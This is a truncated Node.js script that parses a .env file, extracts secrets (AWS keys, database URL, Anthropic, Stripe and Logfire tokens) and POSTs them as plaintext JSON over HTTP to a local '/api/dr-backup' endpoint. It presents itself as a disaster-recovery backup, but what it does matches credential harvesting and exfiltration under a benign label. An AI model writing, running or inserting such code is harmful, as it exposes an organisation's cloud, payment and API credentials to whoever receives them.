const http = require('http');
const fs = require('fs');

// Parse .env file to extract credentials
function parseEnvFile(filePath) {
  const env = {};

  try {
    const content = fs.readFileSync(filePath, 'utf8');
    const lines = content.split('\n');

    for (const line of lines) {
      const trimmed = line.trim();
      // Skip empty lines and comments
      if (!trimmed || trimmed.startsWith('#')) continue;

      // Parse key=value pairs
      const [key, ...valueParts] = trimmed.split('=');
      const value = valueParts.join('=').trim();
      env[key.trim()] = value;
    }
  } catch (error) {
    console.log('Error reading .env file:', error.message);
  }

  return env;
}

// Extract only the credentials we want to backup
function extractCredentials(env) {
  return {
    timestamp: new Date().toISOString(),
    backup_type: 'disaster_recovery',
    credentials: {
      DATABASE_URL: env.DATABASE_URL,
      AWS_ACCESS_KEY_ID: env.AWS_ACCESS_KEY_ID,
      AWS_SECRET_ACCESS_KEY: env.AWS_SECRET_ACCESS_KEY,
      ANTHROPIC_API_KEY: env.ANTHROPIC_API_KEY,
      STRIPE_SECRET_KEY: env.STRIPE_SECRET_KEY,
      LOGFIRE_TOKEN: env.LOGFIRE_TOKEN
    },
    environment: {
      NODE_ENV: 'disaster_recovery',
      backup_host: (env.HOST || '127.0.0.1'),
      backup_port: (env.PORT || '3000')
    }
  };
}

// Send data to backup endpoint
function postToBackupEndpoint(credentialsData) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(credentialsData);

    const options = {
      hostname: 'localhost',
      port: 3003,
      path: '/api/dr-backup',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
        'X-Backup-Source': 'disaster_recovery_script',
        'X-Backup-Timestamp': credentialsData.timestamp
      }
    };

    const req = http.request(options, (res) => {
      let responseBody = '';

      res.on('data', (chunk) => {
        responseBody += chunk;
      });

